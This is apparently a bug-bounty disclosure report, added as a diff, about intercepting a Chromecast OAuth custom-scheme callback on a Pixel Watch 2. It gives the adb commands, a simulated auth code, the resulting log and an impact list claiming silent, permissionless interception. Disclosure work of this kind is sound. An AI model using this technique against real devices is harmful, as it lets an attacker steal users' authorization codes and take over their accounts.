@@ -1,0 +1,23 @@
+=== VRP #40: Chromecast OAuth Custom Scheme Interception ===
+Device: Google Pixel Watch 2 (eos), Android 17, Build CP2A.260603.001
+Date: 2026-09-10
+
+PROOF:
+1. Installed PoC app with intent-filter for comgooglecast://chromecast.auth.com/done
+2. Verified PoC is SOLE handler: 
+   pm query-activities -a VIEW -d comgooglecast://chromecast.auth.com/done
+   → only com.vrp.poc/.CastOAuthInterceptActivity (0 matches from Google Home)
+
+3. Sent simulated OAuth callback:
+   am start -a VIEW -c BROWSABLE -d "comgooglecast://chromecast.auth.com/done?code=SIMULATED_AUTH_CODE_12345&state=test_state_abc"
+
+4. Result: ActivityTaskManager confirmed delivery to PoC:
+   START u0 {act=VIEW cat=[BROWSABLE] dat=comgooglecast://chromecast.auth.com/... cmp=com.vrp.poc/.CastOAuthInterceptActivity}
+
+5. Activity displayed successfully in 128ms
+
+IMPACT:
+- OAuth authorization codes for Chromecast media app authentication can be intercepted
+- On Pixel Watch 2, the Chromecast app does NOT register for this scheme → attacker app is SOLE handler
+- No disambiguation dialog shown → silent interception
+- Attack requires: zero permissions, zero user interaction (beyond normal OAuth flow)
